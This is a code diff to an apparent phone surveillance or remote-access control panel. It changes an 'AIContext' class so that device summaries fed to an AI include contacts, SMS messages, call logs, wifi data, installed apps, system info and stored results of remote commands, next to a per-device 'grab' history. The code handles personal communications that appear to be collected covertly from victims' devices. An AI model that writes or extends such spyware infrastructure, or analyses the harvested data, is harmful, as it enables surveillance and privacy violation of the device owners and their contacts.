@@ -111,6 +111,22 @@ export class AIContext {
       summary.push(`  IP: ${dev.ip}`)
       summary.push(`  Last seen: ${dev.lastSeen ? new Date(dev.lastSeen).toISOString() : 'never'}`)
 
+      // Include raw command response data when available
+      if (dev.ip && dev.ip.length > 5 && dev.ip !== '?') summary.push(`  IP_DATA: ${dev.ip.slice(0, 300)}`)
+      if (dev.sysinfo && dev.sysinfo.length > 5) summary.push(`  SYSINFO: ${dev.sysinfo.slice(0, 600)}`)
+      if (dev.installed && dev.installed.length > 5) summary.push(`  INSTALLED_APPS: ${dev.installed.slice(0, 1500)}`)
+      if (dev.contacts && dev.contacts.length > 10 && !Array.isArray(dev.contacts)) summary.push(`  CONTACTS_DATA: ${dev.contacts.slice(0, 600)}`)
+      if (dev.sms && dev.sms.length > 10 && !Array.isArray(dev.sms)) summary.push(`  SMS_DATA: ${dev.sms.slice(0, 600)}`)
+      if (dev.call_log && dev.call_log.length > 10 && !Array.isArray(dev.call_log)) summary.push(`  CALLLOG_DATA: ${dev.call_log.slice(0, 600)}`)
+      if (dev.wifi && dev.wifi.length > 10 && !Array.isArray(dev.wifi)) summary.push(`  WIFI_DATA: ${dev.wifi.slice(0, 600)}`)
+
+      // Include any last_* command results stored by the approval handler
+      for (const [key, val] of Object.entries(dev)) {
+        if (key.startsWith('last_') && typeof val === 'string' && val.length > 5) {
+          summary.push(`  ${key.replace('last_', '').toUpperCase()}: ${val.slice(0, 600)}`)
+        }
+      }
+
       const grabs = this.getGrabHistory(session, chId)
       if (grabs.length > 0) {
         summary.push(`  Grabs: ${grabs.length} total`)
